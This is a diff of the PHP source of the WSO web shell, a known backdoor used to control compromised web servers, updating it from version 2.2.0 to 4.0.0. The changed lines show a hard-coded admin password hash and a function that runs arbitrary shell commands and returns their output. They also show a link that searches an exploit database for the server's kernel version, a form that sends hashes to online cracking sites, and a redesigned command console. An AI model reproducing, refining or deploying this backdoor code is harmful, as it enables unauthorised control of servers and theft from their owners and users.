@@ -1,5 +1,5 @@
 <?php
-/* WSO 2.2.0 (Web Shell by HARD _LINUX) */
+/* WSO 4.0.0 (Web Shell by HARD _LINUX) */
 $auth_pass = "21232f297a57a5a743894a0e4a801fc3"; //admin
 $color = "#fff";
 $default_action = 'FilesMan';
@@ -15,7 +15,7 @@ if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) {
 @ini_set('max_execution_time',0);
 @set_time_limit(0);
 @set_magic_quotes_runtime(0);
-@define('VERSION', '2.2.0');
+@define('VERSION', '4.0.0');
 if( get_magic_quotes_gpc() ) {
 	function stripslashes_array($array) {
 		return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
@@ -209,7 +209,7 @@ function printHeader() {
 	$totalSpace = $totalSpace?$totalSpace:1;
 	$release = @php_uname('r');
 	$kernel = @php_uname('s');
-	$millink='https://github.com/HARDLINUX/webshell/search?utf8=✓&q=';
+	$millink='http://www.exploit-db.com/search/?action=search&description=';
 	if( strpos('Linux', $kernel) !== false )
 		$millink .= urlencode( 'Linux Kernel ' . substr($release,0,6) );
 	else
@@ -255,7 +255,7 @@ function printHeader() {
 			$drives .= '<a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
 	}
 	echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:'.($GLOBALS['os'] == 'win'?'<br>Drives:':'').'</span></td>'.
-		 '<td><nobr>'.substr(@php_uname(), 0, 120).'  <a href="http://www.google.com/search?q='.urlencode(@php_uname()).'" target="_blank">[Google]</a> <a href="'.$millink.'" target=_blank>[Exploit-Git]</a></nobr><br>'.$uid.' ( '.$user.' ) <span>Group:</span> '.$gid.' ( '.$group.' )<br>'.@phpversion().' <span>Safe mode:</span> '.($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color=#00A8A8><b>OFF</b></font>').' <a href=# onclick="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a> <span>Datetime:</span> '.date('Y-m-d H:i:s').'<br>'.viewSize($totalSpace).' <span>Free:</span> '.viewSize($freeSpace).' ('.(int)($freeSpace/$totalSpace*100).'%)<br>'.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a><br>'.$drives.'</td>'.
+		 '<td><nobr>'.substr(@php_uname(), 0, 120).'  <a href="http://www.google.com/search?q='.urlencode(@php_uname()).'" target="_blank">[Google]</a> <a href="'.$millink.'" target=_blank>[Exploit-DB]</a></nobr><br>'.$uid.' ( '.$user.' ) <span>Group:</span> '.$gid.' ( '.$group.' )<br>'.@phpversion().' <span>Safe mode:</span> '.($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color=#00A8A8><b>OFF</b></font>').' <a href=# onclick="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a> <span>Datetime:</span> '.date('Y-m-d H:i:s').'<br>'.viewSize($totalSpace).' <span>Free:</span> '.viewSize($freeSpace).' ('.(int)($freeSpace/$totalSpace*100).'%)<br>'.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a><br>'.$drives.'</td>'.
 		 '<td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset">'.$opt_charsets.'</optgroup></select><br><span>Server IP:</span><br>'.gethostbyname($_SERVER["HTTP_HOST"]).'<br><span>Client IP:</span><br>'.$_SERVER['REMOTE_ADDR'].'</nobr></td></tr></table>'.
 		 '<table cellpadding=3 cellspacing=0 width=100% style="background-color:teal;"><tr>'.$menu.'</tr></table><div>';
 }
@@ -310,8 +310,8 @@ function ex($in) {
 		while(!@feof($f))
 			$out .= fread($f,1024);
 		pclose($f);
-	}
-	return $out;
+	}else return 'Unable to execute command';
+	return ($out==''?'Query did not return anything':$out);
 }
 function viewSize($s) {
 	if($s >= 1073741824)
@@ -680,6 +680,7 @@ function actionStringTools() {
 	<br><h1>Search for hash:</h1><div class=content>
 		<form method='post' target='_blank' name="hf">
 			<input type="text" name="hash" style="width:200px;"><br>
+			<input type='button' value='hashcracking.ru' onclick="document.hf.action='https://hashcracking.ru/index.php';document.hf.submit()"><br>
 			<input type="button" value="hashcrack.com" onclick="document.hf.action='http://www.hashcrack.com/index.php';document.hf.submit()"><br>
 			<input type="button" value="fakenamegenerator.com" onclick="document.hf.action='http://www.fakenamegenerator.com/';document.hf.submit()"><br>
 			<input type="button" value="tools4noobs.com" onclick="document.hf.action='http://www.tools4noobs.com/online_php_functions/';document.hf.submit()"><br>
@@ -959,7 +960,7 @@ function add(cmd) {
 	if(!empty($_POST['p1'])) {
 		echo htmlspecialchars("$ ".$_POST['p1']."\n".ex($_POST['p1']));
 	}
-	echo '</textarea><input type=text name=cmd style="border-top:0;width:100%;margin:0;" onkeydown="kp(event);">';
+	echo '</textarea><table style="border:1px solid #000;background-color:#000;border-top:0px;" cellpadding=0 cellspacing=0 width="100%"><tr><td style="padding-left:4px; width:13px;">$</td><td><input type=text name=cmd style="border:0px;width:100%;" onkeydown="kp(event);"></td></tr></table>';
 	echo '</form></div><script>document.cf.cmd.focus();</script>';
 	printFooter();
 }
